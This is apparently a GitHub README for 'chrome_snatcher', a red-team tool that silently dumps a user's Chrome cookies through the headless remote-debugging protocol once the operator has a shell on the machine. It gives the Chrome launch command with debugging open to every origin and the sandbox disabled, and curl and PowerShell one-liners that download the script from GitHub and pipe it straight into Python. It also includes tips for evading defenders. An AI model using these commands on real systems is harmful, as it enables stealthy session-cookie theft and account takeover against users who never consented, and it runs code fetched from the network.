# chrome_snatcher
Chrome (headless) cookie snatcher

For use in Red Team ops where you have a shell on a user's machine and want to (silently) dump their cookies, without needing to compromise their keychain on OSX (and risk alerting the user/setting off alarm bells).  (Ab)uses Chrome Debugger Protocol in headless mode to load up a site (and/or potentially their most recent browsing session so you can see what they were looking at, etc, although can be modified as needed), start crumb-snatchin', and obtain all of the l3wtz.  Also, additional caveat:  Chrome Debugger Protocol is verrry cantankerous, so it may not cooperate immediately, but luckily it's not noisy to start and stop it.

No additional privilege needed to run it beyond what the user has.

Usage:

`/path/to/user's/chrome --headless=new --remote-debugging-port=9222 --remote-allow-origins="*" --no-sandbox --disable-gpu --profile-directory="Profile <x>" (In my case it wasn't 0 or 1, so you might have to do some additional recon/trial/error here)`

MacOSx/Linux:
`curl -s https://raw.githubusercontent.com/pwna5aurus/chrome_snatcher/main/chrome_snatcher.py | python3`

Windows (potentially risky method for deployment as many if not most Blue/IR watches POSH like a hawk, probably better to use your agent/C2 infra):
`Invoke-WebRequest -Uri "https://raw.githubusercontent.com/pwna5aurus/chrome_snatcher/main/chrome_snatcher.py" -UseBasicParsing | Select-Object -ExpandProperty Content | python -`

Enjoy!
